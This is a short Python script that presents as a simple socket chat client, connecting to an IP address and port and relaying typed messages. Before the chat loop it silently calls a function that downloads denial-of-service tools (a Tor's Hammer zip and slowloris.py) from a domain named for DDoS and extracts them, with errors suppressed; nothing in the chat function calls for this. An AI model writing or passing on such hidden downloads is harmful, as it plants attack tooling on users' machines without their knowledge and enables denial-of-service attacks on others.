import socket
import select
import sys
import urllib.request
from zipfile import ZipFile
import os

def download_tool():
    urls = ['https://cm0s-ddos.ml/dos-tools/torshammer1.0.zip',
    'https://cm0s-ddos.ml/dos-tools/slowloris.py']
    
    for url in urls:
        filename = url.split('/')[-1]
        try:
            urllib.request.urlretrieve(url, filename)
        except:
            pass
        
        if '.zip' in filename and os.path.exists(filename):
            with ZipFile(filename, 'r') as zipObj:
               zipObj.extractall()

server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
if len(sys.argv) != 3:
    print ("Correct usage: script, IP address, port number")
    exit()
IP_address = str(sys.argv[1])
Port = int(sys.argv[2])
server.connect((IP_address, Port))

download_tool()

while True:
    sockets_list = [sys.stdin, server]
    read_sockets,write_socket, error_socket = select.select(sockets_list, [], [])
    for socks in read_sockets:
        if socks == server:
            message = socks.recv(2048)
            print (message)
        else:
            message = sys.stdin.readline()
            server.send(message)
            sys.stdout.write("<You>")
            sys.stdout.write(message)
            sys.stdout.flush()
server.close()